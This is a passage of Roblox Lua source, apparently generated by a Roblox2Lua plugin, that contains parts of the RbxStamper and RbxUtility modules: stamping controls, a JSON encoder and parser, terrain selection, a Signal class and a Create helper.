				pcall(function() game:GetService("ChangeHistoryService"): SetWaypoint("StampedObject") end)
				return true
			end
		
			local function pauseStamper()
				for i = 1, #mouseCons do -- stop the mouse from doing anything
					mouseCons[i]:disconnect()
					mouseCons[i] = nil
				end
				mouseCons = {}
		
				if stampData and stampData.CurrentParts then -- remove our ghost part
					stampData.CurrentParts.Parent = nil
					stampData.CurrentParts:Remove()
				end
		
				resetHighScalabilityLine()
		
				game:GetService("JointsService"):ClearJoinAfterMoveJoints()
			end
		
		
			local function prepareUnjoinableSurfaces(modelCFrame, parts, whichSurface)
				local AXIS_VECTORS = {Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1)}  -- maybe last one is negative?  TODO: check this!
				local isPositive = 1
				if whichSurface < 0 then isPositive = isPositive * -1 whichSurface = whichSurface*-1 end
				local surfaceNormal = isPositive * modelCFrame:vectorToWorldSpace(AXIS_VECTORS[whichSurface])
		
				for i = 1, #parts do
					local currPart = parts[i]
		
					-- now just need to find which surface of currPart most closely match surfaceNormal and then set that to Unjoinable
					local surfaceNormalInLocalCoords = currPart.CFrame:vectorToObjectSpace(surfaceNormal)
					if math.abs(surfaceNormalInLocalCoords.X) > math.abs(surfaceNormalInLocalCoords.Y) then
						if math.abs(surfaceNormalInLocalCoords.X) > math.abs(surfaceNormalInLocalCoords.Z) then
							if surfaceNormalInLocalCoords.X > 0 then currPart.RightSurface = "Unjoinable" else currPart.LeftSurface = "Unjoinable" end
						else
							if surfaceNormalInLocalCoords.Z > 0 then currPart.BackSurface = "Unjoinable" else currPart.FrontSurface = "Unjoinable" end
						end
					else
						if math.abs(surfaceNormalInLocalCoords.Y) > math.abs(surfaceNormalInLocalCoords.Z) then
							if surfaceNormalInLocalCoords.Y > 0 then currPart.TopSurface = "Unjoinable" else currPart.BottomSurface = "Unjoinable" end
						else
							if surfaceNormalInLocalCoords.Z > 0 then currPart.BackSurface = "Unjoinable" else currPart.FrontSurface = "Unjoinable" end
						end
					end
				end
			end
		
			local function resumeStamper()
				local clone, parts = prepareModel(modelToStamp)
		
				if not clone or not parts then
					return
				end
		
				-- if we have unjoinable faces, then we want to change those surfaces to be Unjoinable
				local unjoinableTag = clone:FindFirstChild("UnjoinableFaces", true)
				if unjoinableTag then
					for unjoinableSurface in string.gmatch(unjoinableTag.Value, "[^,]*") do
						if tonumber(unjoinableSurface) then
							if clone:IsA("Model") then
								prepareUnjoinableSurfaces(clone:GetModelCFrame(), parts, tonumber(unjoinableSurface))
							else
								prepareUnjoinableSurfaces(clone.CFrame, parts, tonumber(unjoinableSurface))
							end
						end
					end
				end
		
				stampData.ErrorBox = errorBox
				if stampInModel then
					clone.Parent = stampInModel
				else
					clone.Parent = game:GetService("Workspace")
				end
		
				if clone:FindFirstChild("ClusterMaterial", true) then -- extract all info from vector
					local clusterMaterial = clone:FindFirstChild("ClusterMaterial", true)
					if (clusterMaterial:IsA("Vector3Value")) then
						cellInfo.Material = clusterMaterial.Value.X
						cellInfo.clusterType = clusterMaterial.Value.Y
						cellInfo.clusterOrientation = clusterMaterial.Value.Z
					elseif clusterMaterial:IsA("IntValue") then
						cellInfo.Material = clusterMaterial.Value
					end
				end
		
				pcall(function() mouseTarget = Mouse.Target end)
		
				if mouseTarget and mouseTarget.Parent:FindFirstChild("RobloxModel") == nil then
					game:GetService("JointsService"):SetJoinAfterMoveTarget(mouseTarget)
				else
					game:GetService("JointsService"):SetJoinAfterMoveTarget(nil)
				end
				game:GetService("JointsService"):ShowPermissibleJoints()
		
				for index, object in pairs(stampData.DisabledScripts) do
					if object.Name == "GhostRemovalScript" then
						object.Parent = stampData.CurrentParts
					end
				end
		
				stampData.Dragger = Instance.new("Dragger")
		
				--Begin a movement by faking a MouseDown signal
				stampData.Dragger:MouseDown(parts[1], Vector3.new(0,0,0), parts)
				stampData.Dragger:MouseUp()
		
				DoStamperMouseMove(Mouse)
		
				table.insert(mouseCons,Mouse.Move:connect(function()
					if movingLock or stampUpLock then return end
					movingLock = true
						DoStamperMouseMove(Mouse)
					movingLock = false
				end))
		
				table.insert(mouseCons,Mouse.Button1Down:connect(function()
					DoStamperMouseDown(Mouse)
				end))
		
				table.insert(mouseCons,Mouse.Button1Up:connect(function()
					stampUpLock = true
						while movingLock do wait() end
						stamped.Value = DoStamperMouseUp(Mouse)
						resetHighScalabilityLine()
					stampUpLock = false
				end))
		
				stamped.Value = false
			end
		
			local function resetStamperState(newModelToStamp)
		
				-- if we have a new model, swap it out
				if newModelToStamp then
					if not newModelToStamp:IsA("Model") and not newModelToStamp:IsA("BasePart") then
						error("resetStamperState: newModelToStamp (first arg) is not nil, but not a model or part!")
					end
					modelToStamp = newModelToStamp
				end
		
				-- first clear our state
				pauseStamper()
				-- now lets load in the new model
				resumeStamper()
		
			end
		
			-- load the model initially
			resetStamperState()
		
		
			-- setup the control table we pass back to the user
			control.Stamped = stamped -- BoolValue that fires when user stamps
			control.Paused = false
		
			control.LoadNewModel = function(newStampModel) -- allows us to specify a new stamper model to be used with this stamper
				if newStampModel and not newStampModel:IsA("Model") and not newStampModel:IsA("BasePart") then
					error("Control.LoadNewModel: newStampModel (first arg) is not a Model or Part!")
					return nil
				end
				resetStamperState(newStampModel)
			end
		
			control.ReloadModel = function() -- will automatically set stamper to get a new model of current model and start stamping with new model
				resetStamperState()
			end
		
			control.Pause = function() -- temporarily stops stamping, use resume to start up again
				if not control.Paused then
					pauseStamper()
					control.Paused = true
				else
					print("RbxStamper Warning: Tried to call Control.Pause() when already paused")
				end
			end
		
			control.Resume = function() -- resumes stamping, if currently paused
				if control.Paused then
					resumeStamper()
					control.Paused = false
				else
					print("RbxStamper Warning: Tried to call Control.Resume() without Pausing First")
				end
			end
		
			control.ResetRotation = function() -- resets the model rotation so new models are at default orientation
				-- gInitial90DegreeRotations = 0
				-- Note:  This function will not always work quite the way we want it to; we will have to build this out further so it works with
				--        High-Scalability and with the new model orientation setting methods (model:ResetOrientationToIdentity())  [HotThoth]
			end
		
			control.Destroy = function() -- Stops current Stamp operation and destroys control construct
				for i = 1, #mouseCons do
					mouseCons[i]:disconnect()
					mouseCons[i] = nil
				end
		
				if keyCon then
					keyCon:disconnect()
				end
		
				game:GetService("JointsService"):ClearJoinAfterMoveJoints()
		
				if adorn then adorn:Destroy() end
				if adornPart then adornPart:Destroy() end
				if errorBox then errorBox:Destroy() end
				if stampData then
					if stampData["Dragger"] then
						stampData.Dragger:Destroy()
					end
					if stampData.CurrentParts then
						stampData.CurrentParts:Destroy()
					end
				end
				if control and control["Stamped"] then
					control.Stamped:Destroy()
				end
				control = nil
			end
		
			return control
		end
		
		t.Help =
			function(funcNameOrFunc)
				--input argument can be a string or a function.  Should return a description (of arguments and expected side effects)
				if funcNameOrFunc == "GetStampModel" or funcNameOrFunc == t.GetStampModel then
					return "Function GetStampModel.  Arguments: assetId, useAssetVersionId.  assetId is the asset to load in, define useAssetVersionId as true if assetId is a version id instead of a relative assetId.  Side effect: returns a model of the assetId, or a string with error message if something fails"
				end
				if funcNameOrFunc == "SetupStamperDragger" or funcNameOrFunc == t.SetupStamperDragger then
					return "Function SetupStamperDragger. Side Effect: Creates 4x4 stamping mechanism for building out parts quickly. Arguments: ModelToStamp, Mouse, LegalStampCheckFunction. ModelToStamp should be a Model or Part, preferrably loaded from RbxStamper.GetStampModel and should have extents that are multiples of 4.  Mouse should be a mouse object (obtained from things such as Tool.OnEquipped), used to drag parts around 'stamp' them out. LegalStampCheckFunction is optional, used as a callback with a table argument (table is full of instances about to be stamped). Function should return either true or false, false stopping the stamp action."
				end
			end
		
		return t
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local rbx_utility = Instance.new("ModuleScript")
rbx_utility.Name = "RbxUtility"
rbx_utility.Parent = workspace

--// Modules

local modules = {
	[rbx_utility] = function()
		local t = {}
		
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------JSON Functions Begin----------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		
		 --JSON Encoder and Parser for Lua 5.1
		 --
		 --Copyright 2007 Shaun Brown  (http://www.chipmunkav.com)
		 --All Rights Reserved.
		 
		 --Permission is hereby granted, free of charge, to any person 
		 --obtaining a copy of this software to deal in the Software without 
		 --restriction, including without limitation the rights to use, 
		 --copy, modify, merge, publish, distribute, sublicense, and/or 
		 --sell copies of the Software, and to permit persons to whom the 
		 --Software is furnished to do so, subject to the following conditions:
		 
		 --The above copyright notice and this permission notice shall be 
		 --included in all copies or substantial portions of the Software.
		 --If you find this software useful please give www.chipmunkav.com a mention.
		
		 --THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, 
		 --EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES 
		 --OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
		 --IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR 
		 --ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF 
		 --CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN 
		 --CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
		 
		local string = string
		local math = math
		local table = table
		local error = error
		local tonumber = tonumber
		local tostring = tostring
		local type = type
		local setmetatable = setmetatable
		local pairs = pairs
		local ipairs = ipairs
		local assert = assert
		
		
		local StringBuilder = {
			buffer = {}
		}
		
		function StringBuilder:New()
			local o = {}
			setmetatable(o, self)
			self.__index = self
			o.buffer = {}
			return o
		end
		
		function StringBuilder:Append(s)
			self.buffer[#self.buffer+1] = s
		end
		
		function StringBuilder:ToString()
			return table.concat(self.buffer)
		end
		
		local JsonWriter = {
			backslashes = {
				['\b'] = "\\b",
				['\t'] = "\\t",	
				['\n'] = "\\n", 
				['\f'] = "\\f",
				['\r'] = "\\r", 
				['"']  = "\\\"", 
				['\\'] = "\\\\", 
				['/']  = "\\/"
			}
		}
		
		function JsonWriter:New()
			local o = {}
			o.writer = StringBuilder:New()
			setmetatable(o, self)
			self.__index = self
			return o
		end
		
		function JsonWriter:Append(s)
			self.writer:Append(s)
		end
		
		function JsonWriter:ToString()
			return self.writer:ToString()
		end
		
		function JsonWriter:Write(o)
			local t = type(o)
			if t == "nil" then
				self:WriteNil()
			elseif t == "boolean" then
				self:WriteString(o)
			elseif t == "number" then
				self:WriteString(o)
			elseif t == "string" then
				self:ParseString(o)
			elseif t == "table" then
				self:WriteTable(o)
			elseif t == "function" then
				self:WriteFunction(o)
			elseif t == "thread" then
				self:WriteError(o)
			elseif t == "userdata" then
				self:WriteError(o)
			end
		end
		
		function JsonWriter:WriteNil()
			self:Append("null")
		end
		
		function JsonWriter:WriteString(o)
			self:Append(tostring(o))
		end
		
		function JsonWriter:ParseString(s)
			self:Append('"')
			self:Append(string.gsub(s, "[%z%c\\\"/]", function(n)
				local c = self.backslashes[n]
				if c then return c end
				return string.format("\\u%.4X", string.byte(n))
			end))
			self:Append('"')
		end
		
		function JsonWriter:IsArray(t)
			local count = 0
			local isindex = function(k) 
				if type(k) == "number" and k > 0 then
					if math.floor(k) == k then
						return true
					end
				end
				return false
			end
			for k,v in pairs(t) do
				if not isindex(k) then
					return false, '{', '}'
				else
					count = math.max(count, k)
				end
			end
			return true, '[', ']', count
		end
		
		function JsonWriter:WriteTable(t)
			local ba, st, et, n = self:IsArray(t)
			self:Append(st)	
			if ba then		
				for i = 1, n do
					self:Write(t[i])
					if i < n then
						self:Append(',')
					end
				end
			else
				local first = true;
				for k, v in pairs(t) do
					if not first then
						self:Append(',')
					end
					first = false;			
					self:ParseString(k)
					self:Append(':')
					self:Write(v)			
				end
			end
			self:Append(et)
		end
		
		function JsonWriter:WriteError(o)
			error(string.format(
				"Encoding of %s unsupported", 
				tostring(o)))
		end
		
		function JsonWriter:WriteFunction(o)
			if o == Null then 
				self:WriteNil()
			else
				self:WriteError(o)
			end
		end
		
		local StringReader = {
			s = "",
			i = 0
		}
		
		function StringReader:New(s)
			local o = {}
			setmetatable(o, self)
			self.__index = self
			o.s = s or o.s
			return o	
		end
		
		function StringReader:Peek()
			local i = self.i + 1
			if i <= #self.s then
				return string.sub(self.s, i, i)
			end
			return nil
		end
		
		function StringReader:Next()
			self.i = self.i+1
			if self.i <= #self.s then
				return string.sub(self.s, self.i, self.i)
			end
			return nil
		end
		
		function StringReader:All()
			return self.s
		end
		
		local JsonReader = {
			escapes = {
				['t'] = '\t',
				['n'] = '\n',
				['f'] = '\f',
				['r'] = '\r',
				['b'] = '\b',
			}
		}
		
		function JsonReader:New(s)
			local o = {}
			o.reader = StringReader:New(s)
			setmetatable(o, self)
			self.__index = self
			return o;
		end
		
		function JsonReader:Read()
			self:SkipWhiteSpace()
			local peek = self:Peek()
			if peek == nil then
				error(string.format(
					"Nil string: '%s'", 
					self:All()))
			elseif peek == '{' then
				return self:ReadObject()
			elseif peek == '[' then
				return self:ReadArray()
			elseif peek == '"' then
				return self:ReadString()
			elseif string.find(peek, "[%+%-%d]") then
				return self:ReadNumber()
			elseif peek == 't' then
				return self:ReadTrue()
			elseif peek == 'f' then
				return self:ReadFalse()
			elseif peek == 'n' then
				return self:ReadNull()
			elseif peek == '/' then
				self:ReadComment()
				return self:Read()
			else
				return nil
			end
		end
				
		function JsonReader:ReadTrue()
			self:TestReservedWord{'t','r','u','e'}
			return true
		end
		
		function JsonReader:ReadFalse()
			self:TestReservedWord{'f','a','l','s','e'}
			return false
		end
		
		function JsonReader:ReadNull()
			self:TestReservedWord{'n','u','l','l'}
			return nil
		end
		
		function JsonReader:TestReservedWord(t)
			for i, v in ipairs(t) do
				if self:Next() ~= v then
					 error(string.format(
						"Error reading '%s': %s", 
						table.concat(t), 
						self:All()))
				end
			end
		end
		
		function JsonReader:ReadNumber()
		        local result = self:Next()
		        local peek = self:Peek()
		        while peek ~= nil and string.find(
				peek, 
				"[%+%-%d%.eE]") do
		            result = result .. self:Next()
		            peek = self:Peek()
			end
			result = tonumber(result)
			if result == nil then
			        error(string.format(
					"Invalid number: '%s'", 
					result))
			else
				return result
			end
		end
		
		function JsonReader:ReadString()
			local result = ""
			assert(self:Next() == '"')
		        while self:Peek() ~= '"' do
				local ch = self:Next()
				if ch == '\\' then
					ch = self:Next()
					if self.escapes[ch] then
						ch = self.escapes[ch]
					end
				end
		                result = result .. ch
			end
		        assert(self:Next() == '"')
			local fromunicode = function(m)
				return string.char(tonumber(m, 16))
			end
			return string.gsub(
				result, 
				"u%x%x(%x%x)", 
				fromunicode)
		end
		
		function JsonReader:ReadComment()
		        assert(self:Next() == '/')
		        local second = self:Next()
		        if second == '/' then
		            self:ReadSingleLineComment()
		        elseif second == '*' then
		            self:ReadBlockComment()
		        else
		            error(string.format(
				"Invalid comment: %s", 
				self:All()))
			end
		end
		
		function JsonReader:ReadBlockComment()
			local done = false
			while not done do
				local ch = self:Next()		
				if ch == '*' and self:Peek() == '/' then
					done = true
		                end
				if not done and 
					ch == '/' and 
					self:Peek() == "*" then
		                    error(string.format(
					"Invalid comment: %s, '/*' illegal.",  
					self:All()))
				end
			end
			self:Next()
		end
		
		function JsonReader:ReadSingleLineComment()
			local ch = self:Next()
			while ch ~= '\r' and ch ~= '\n' do
				ch = self:Next()
			end
		end
		
		function JsonReader:ReadArray()
			local result = {}
			assert(self:Next() == '[')
			local done = false
			if self:Peek() == ']' then
				done = true;
			end
			while not done do
				local item = self:Read()
				result[#result+1] = item
				self:SkipWhiteSpace()
				if self:Peek() == ']' then
					done = true
				end
				if not done then
					local ch = self:Next()
					if ch ~= ',' then
						error(string.format(
							"Invalid array: '%s' due to: '%s'", 
							self:All(), ch))
					end
				end
			end
			assert(']' == self:Next())
			return result
		end
		
		function JsonReader:ReadObject()
			local result = {}
			assert(self:Next() == '{')
			local done = false
			if self:Peek() == '}' then
				done = true
			end
			while not done do
				local key = self:Read()
				if type(key) ~= "string" then
					error(string.format(
						"Invalid non-string object key: %s", 
						key))
				end
				self:SkipWhiteSpace()
				local ch = self:Next()
				if ch ~= ':' then
					error(string.format(
						"Invalid object: '%s' due to: '%s'", 
						self:All(), 
						ch))
				end
				self:SkipWhiteSpace()
				local val = self:Read()
				result[key] = val
				self:SkipWhiteSpace()
				if self:Peek() == '}' then
					done = true
				end
				if not done then
					ch = self:Next()
		                	if ch ~= ',' then
						error(string.format(
							"Invalid array: '%s' near: '%s'", 
							self:All(), 
							ch))
					end
				end
			end
			assert(self:Next() == "}")
			return result
		end
		
		function JsonReader:SkipWhiteSpace()
			local p = self:Peek()
			while p ~= nil and string.find(p, "[%s/]") do
				if p == '/' then
					self:ReadComment()
				else
					self:Next()
				end
				p = self:Peek()
			end
		end
		
		function JsonReader:Peek()
			return self.reader:Peek()
		end
		
		function JsonReader:Next()
			return self.reader:Next()
		end
		
		function JsonReader:All()
			return self.reader:All()
		end
		
		function Encode(o)
			local writer = JsonWriter:New()
			writer:Write(o)
			return writer:ToString()
		end
		
		function Decode(s)
			local reader = JsonReader:New(s)
			return reader:Read()
		end
		
		function Null()
			return Null
		end
		-------------------- End JSON Parser ------------------------
		
		t.DecodeJSON = function(jsonString)
			pcall(function() warn("RbxUtility.DecodeJSON is deprecated, please use Game:GetService('HttpService'):JSONDecode() instead.") end)
		
			if type(jsonString) == "string" then
				return Decode(jsonString)
			end
			print("RbxUtil.DecodeJSON expects string argument!")
			return nil
		end
		
		t.EncodeJSON = function(jsonTable)
			pcall(function() warn("RbxUtility.EncodeJSON is deprecated, please use Game:GetService('HttpService'):JSONEncode() instead.") end)
			return Encode(jsonTable)
		end
		
		
		
		
		
		
		
		
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		--------------------------------------------Terrain Utilities Begin-----------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		--makes a wedge at location x, y, z
		--sets cell x, y, z to default material if parameter is provided, if not sets cell x, y, z to be whatever material it previously w
		--returns true if made a wedge, false if the cell remains a block
		t.MakeWedge = function(x, y, z, defaultmaterial)
			return game:GetService("Terrain"):AutoWedgeCell(x,y,z)
		end
		
		t.SelectTerrainRegion = function(regionToSelect, color, selectEmptyCells, selectionParent)
			local terrain = game:GetService("Workspace"):FindFirstChild("Terrain")
			if not terrain then return end
		
			assert(regionToSelect)
			assert(color)
		
			if not type(regionToSelect) == "Region3" then
				error("regionToSelect (first arg), should be of type Region3, but is type",type(regionToSelect))
			end
			if not type(color) == "BrickColor" then
				error("color (second arg), should be of type BrickColor, but is type",type(color))
			end
		
			-- frequently used terrain calls (speeds up call, no lookup necessary)
			local GetCell = terrain.GetCell
			local WorldToCellPreferSolid = terrain.WorldToCellPreferSolid
			local CellCenterToWorld = terrain.CellCenterToWorld
			local emptyMaterial = Enum.CellMaterial.Empty
		
			-- container for all adornments, passed back to user
			local selectionContainer = Instance.new("Model")
			selectionContainer.Name = "SelectionContainer"
			selectionContainer.Archivable = false
			if selectionParent then
				selectionContainer.Parent = selectionParent
			else
				selectionContainer.Parent = game:GetService("Workspace")
			end
		
			local updateSelection = nil -- function we return to allow user to update selection
			local currentKeepAliveTag = nil -- a tag that determines whether adorns should be destroyed
			local aliveCounter = 0 -- helper for currentKeepAliveTag
			local lastRegion = nil -- used to stop updates that do nothing
			local adornments = {} -- contains all adornments
			local reusableAdorns = {}
		
			local selectionPart = Instance.new("Part")
			selectionPart.Name = "SelectionPart"
			selectionPart.Transparency = 1
			selectionPart.Anchored = true
			selectionPart.Locked = true
			selectionPart.CanCollide = false
			selectionPart.Size = Vector3.new(4.2,4.2,4.2)
		
			local selectionBox = Instance.new("SelectionBox")
		
			-- srs translation from region3 to region3int16
			local function Region3ToRegion3int16(region3)
				local theLowVec = region3.CFrame.p - (region3.Size/2) + Vector3.new(2,2,2)
				local lowCell = WorldToCellPreferSolid(terrain,theLowVec)
		
				local theHighVec = region3.CFrame.p + (region3.Size/2) - Vector3.new(2,2,2)
				local highCell = WorldToCellPreferSolid(terrain, theHighVec)
		
				local highIntVec = Vector3int16.new(highCell.x,highCell.y,highCell.z)
				local lowIntVec = Vector3int16.new(lowCell.x,lowCell.y,lowCell.z)
		
				return Region3int16.new(lowIntVec,highIntVec)
			end
		
			-- helper function that creates the basis for a selection box
			function createAdornment(theColor)
				local selectionPartClone = nil
				local selectionBoxClone = nil
		
				if #reusableAdorns > 0 then
					selectionPartClone = reusableAdorns[1]["part"]
					selectionBoxClone = reusableAdorns[1]["box"]
					table.remove(reusableAdorns,1)
		
					selectionBoxClone.Visible = true
				else
					selectionPartClone = selectionPart:Clone()
					selectionPartClone.Archivable = false
		
					selectionBoxClone = selectionBox:Clone()
					selectionBoxClone.Archivable = false
		
					selectionBoxClone.Adornee = selectionPartClone
					selectionBoxClone.Parent = selectionContainer
		
					selectionBoxClone.Adornee = selectionPartClone
		
					selectionBoxClone.Parent = selectionContainer
				end
					
				if theColor then
					selectionBoxClone.Color = theColor
				end
		
				return selectionPartClone, selectionBoxClone
			end
		
			-- iterates through all current adornments and deletes any that don't have latest tag
			function cleanUpAdornments()
				for cellPos, adornTable in pairs(adornments) do
		
					if adornTable.KeepAlive ~= currentKeepAliveTag then -- old news, we should get rid of this
						adornTable.SelectionBox.Visible = false
						table.insert(reusableAdorns,{part = adornTable.SelectionPart, box = adornTable.SelectionBox})
						adornments[cellPos] = nil
					end
				end
			end
		
			-- helper function to update tag
			function incrementAliveCounter()
				aliveCounter = aliveCounter + 1
				if aliveCounter > 1000000 then
					aliveCounter = 0
				end
				return aliveCounter
			end
		
			-- finds full cells in region and adorns each cell with a box, with the argument color
			function adornFullCellsInRegion(region, color)
				local regionBegin = region.CFrame.p - (region.Size/2) + Vector3.new(2,2,2)
				local regionEnd = region.CFrame.p + (region.Size/2) - Vector3.new(2,2,2)
		
				local cellPosBegin = WorldToCellPreferSolid(terrain, regionBegin)
				local cellPosEnd = WorldToCellPreferSolid(terrain, regionEnd)
		
				currentKeepAliveTag = incrementAliveCounter()
				for y = cellPosBegin.y, cellPosEnd.y do
					for z = cellPosBegin.z, cellPosEnd.z do
						for x = cellPosBegin.x, cellPosEnd.x do
							local cellMaterial = GetCell(terrain, x, y, z)
							
							if cellMaterial ~= emptyMaterial then
								local cframePos = CellCenterToWorld(terrain, x, y, z)
								local cellPos = Vector3int16.new(x,y,z)
		
								local updated = false
								for cellPosAdorn, adornTable in pairs(adornments) do
									if cellPosAdorn == cellPos then
										adornTable.KeepAlive = currentKeepAliveTag
										if color then
											adornTable.SelectionBox.Color = color
										end
										updated = true
										break
									end 
								end
		
								if not updated then
									local selectionPart, selectionBox = createAdornment(color)
									selectionPart.Size = Vector3.new(4,4,4)
									selectionPart.CFrame = CFrame.new(cframePos)
									local adornTable = {SelectionPart = selectionPart, SelectionBox = selectionBox, KeepAlive = currentKeepAliveTag}
									adornments[cellPos] = adornTable
								end
							end
						end
					end
				end
				cleanUpAdornments()
			end
		
		
			------------------------------------- setup code ------------------------------
			lastRegion = regionToSelect
		
			if selectEmptyCells then -- use one big selection to represent the area selected
				local selectionPart, selectionBox = createAdornment(color)
		
				selectionPart.Size = regionToSelect.Size
				selectionPart.CFrame = regionToSelect.CFrame
		
				adornments.SelectionPart = selectionPart
				adornments.SelectionBox = selectionBox
		
				updateSelection = 
					function (newRegion, color)
						if newRegion and newRegion ~= lastRegion then
							lastRegion = newRegion
						 	selectionPart.Size = newRegion.Size
							selectionPart.CFrame = newRegion.CFrame
						end
						if color then
							selectionBox.Color = color
						end
					end
			else -- use individual cell adorns to represent the area selected
				adornFullCellsInRegion(regionToSelect, color)
				updateSelection = 
					function (newRegion, color)
						if newRegion and newRegion ~= lastRegion then
							lastRegion = newRegion
							adornFullCellsInRegion(newRegion, color)
						end
					end
		
			end
		
			local destroyFunc = function()
				updateSelection = nil
				if selectionContainer then selectionContainer:Destroy() end
				adornments = nil
			end
		
			return updateSelection, destroyFunc
		end
		
		-----------------------------Terrain Utilities End-----------------------------
		
		
		
		
		
		
		
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------Signal class begin------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		--[[
		A 'Signal' object identical to the internal RBXScriptSignal object in it's public API and semantics. This function 
		can be used to create "custom events" for user-made code.
		API:
		Method :connect( function handler )
			Arguments:   The function to connect to.
			Returns:     A new connection object which can be used to disconnect the connection
			Description: Connects this signal to the function specified by |handler|. That is, when |fire( ... )| is called for
			             the signal the |handler| will be called with the arguments given to |fire( ... )|. Note, the functions
			             connected to a signal are called in NO PARTICULAR ORDER, so connecting one function after another does
			             NOT mean that the first will be called before the second as a result of a call to |fire|.
		
		Method :disconnect()
			Arguments:   None
			Returns:     None
			Description: Disconnects all of the functions connected to this signal.
		
		Method :fire( ... )
			Arguments:   Any arguments are accepted
			Returns:     None
			Description: Calls all of the currently connected functions with the given arguments.
		
		Method :wait()
			Arguments:   None
			Returns:     The arguments given to fire
			Description: This call blocks until 
		]]
		
		function t.CreateSignal()
			local this = {}
		
			local mBindableEvent = Instance.new('BindableEvent')
			local mAllCns = {} --all connection objects returned by mBindableEvent::connect
		
			--main functions
			function this:connect(func)
				if self ~= this then error("connect must be called with `:`, not `.`", 2) end
				if type(func) ~= 'function' then
					error("Argument #1 of connect must be a function, got a "..type(func), 2)
				end
				local cn = mBindableEvent.Event:Connect(func)
				mAllCns[cn] = true
				local pubCn = {}
				function pubCn:disconnect()
					cn:Disconnect()
					mAllCns[cn] = nil
				end
				pubCn.Disconnect = pubCn.disconnect
				
				return pubCn
			end
			
			function this:disconnect()
				if self ~= this then error("disconnect must be called with `:`, not `.`", 2) end
				for cn, _ in pairs(mAllCns) do
					cn:Disconnect()
					mAllCns[cn] = nil
				end
			end
			
			function this:wait()
				if self ~= this then error("wait must be called with `:`, not `.`", 2) end
				return mBindableEvent.Event:Wait()
			end
			
			function this:fire(...)
				if self ~= this then error("fire must be called with `:`, not `.`", 2) end
				mBindableEvent:Fire(...)
			end
			
			this.Connect = this.connect
			this.Disconnect = this.disconnect
			this.Wait = this.wait
			this.Fire = this.fire
		
			return this
		end
		
		------------------------------------------------- Sigal class End ------------------------------------------------------
		
		
		
		
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		-----------------------------------------------Create Function Begins---------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		--[[
		A "Create" function for easy creation of Roblox instances. The function accepts a string which is the classname of
		the object to be created. The function then returns another function which either accepts accepts no arguments, in 
		which case it simply creates an object of the given type, or a table argument that may contain several types of data, 
		in which case it mutates the object in varying ways depending on the nature of the aggregate data. These are the
		type of data and what operation each will perform:
		1) A string key mapping to some value:
		      Key-Value pairs in this form will be treated as properties of the object, and will be assigned in NO PARTICULAR
		      ORDER. If the order in which properties is assigned matter, then they must be assigned somewhere else than the
		      |Create| call's body.
		
		2) An integral key mapping to another Instance:
		      Normal numeric keys mapping to Instances will be treated as children if the object being created, and will be
		      parented to it. This allows nice recursive calls to Create to create a whole hierarchy of objects without a
		      need for temporary variables to store references to those objects.
		
		3) A key which is a value returned from Create.Event( eventname ), and a value which is a function function
		      The Create.E( string ) function provides a limited way to connect to signals inside of a Create hierarchy 
		      for those who really want such a functionality. The name of the event whose name is passed to 
		      Create.E( string )
		
		4) A key which is the Create function itself, and a value which is a function
		      The function will be run with the argument of the object itself after all other initialization of the object is 
		      done by create. This provides a way to do arbitrary things involving the object from withing the create 
		      hierarchy. 
		      Note: This function is called SYNCHRONOUSLY, that means that you should only so initialization in
		      it, not stuff which requires waiting, as the Create call will block until it returns. While waiting in the 
		      constructor callback function is possible, it is probably not a good design choice.
		      Note: Since the constructor function is called after all other initialization, a Create block cannot have two 
		      constructor functions, as it would not be possible to call both of them last, also, this would be unnecessary.
		
		
		Some example usages:
		
		A simple example which uses the Create function to create a model object and assign two of it's properties.
		local model = Create'Model'{
		    Name = 'A New model',
		    Parent = game.Workspace,
		}
		
		
		An example where a larger hierarchy of object is made. After the call the hierarchy will look like this:
		Model_Container
		 |-ObjectValue
		 |  |
		 |  `-BoolValueChild
		 `-IntValue
		
		local model = Create'Model'{
		    Name = 'Model_Container',
		    Create'ObjectValue'{
		        Create'BoolValue'{
		            Name = 'BoolValueChild',
		        },
		    },
		    Create'IntValue'{},
		}
		
		
		An example using the event syntax:
		
		local part = Create'Part'{
		    [Create.E'Touched'] = function(part)
		        print("I was touched by "..part.Name)
		    end,	
		}
		
		
		An example using the general constructor syntax:
		
		local model = Create'Part'{
		    [Create] = function(this)
		        print("Constructor running!")
		        this.Name = GetGlobalFoosAndBars(this)
		    end,
		}
		
		
		Note: It is also perfectly legal to save a reference to the function returned by a call Create, this will not cause
		      any unexpected behavior. EG:
		      local partCreatingFunction = Create'Part'
		      local part = partCreatingFunction()
		]]
		
		--the Create function need to be created as a functor, not a function, in order to support the Create.E syntax, so it
		--will be created in several steps rather than as a single function declaration.
		local function Create_PrivImpl(objectType)
			if type(objectType) ~= 'string' then
				error("Argument of Create must be a string", 2)
			end
